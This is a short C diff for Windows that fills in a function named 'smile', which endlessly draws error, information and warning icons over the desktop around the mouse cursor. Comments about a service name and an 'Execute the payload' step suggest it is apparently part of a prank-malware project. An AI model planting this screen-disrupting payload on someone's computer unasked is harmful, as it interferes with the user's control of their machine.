@@ -6,7 +6,30 @@
 extern char serviceName[64];
 
 DWORD WINAPI smile(){
+    int ix = GetSystemMetrics(SM_CXICON) / 2;
+    int iy = GetSystemMetrics(SM_CYICON) / 2;
 
+    HWND hwnd = GetDesktopWindow();
+    HDC hdc = GetWindowDC(hwnd);
+
+    POINT cursor;
+
+    while(1){
+        GetCursorPos(&cursor);
+        
+        DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
+
+        DrawIcon(hdc, cursor.x - ix - 30, cursor.y - iy - 30, LoadIcon(NULL, IDI_INFORMATION));
+        DrawIcon(hdc, cursor.x - ix + 30, cursor.y - iy - 30, LoadIcon(NULL, IDI_INFORMATION));
+        
+        DrawIcon(hdc, cursor.x - ix - 15, cursor.y - iy + 30, LoadIcon(NULL, IDI_WARNING));
+        DrawIcon(hdc, cursor.x - ix + 15, cursor.y - iy + 30, LoadIcon(NULL, IDI_WARNING));
+        DrawIcon(hdc, cursor.x - ix - 45, cursor.y - iy + 15, LoadIcon(NULL, IDI_WARNING));
+        DrawIcon(hdc, cursor.x - ix + 45, cursor.y - iy + 15, LoadIcon(NULL, IDI_WARNING));
+        Sleep(10);
+    }
+
+    ReleaseDC(hwnd, hdc);
 }
 
 // Execute the payload
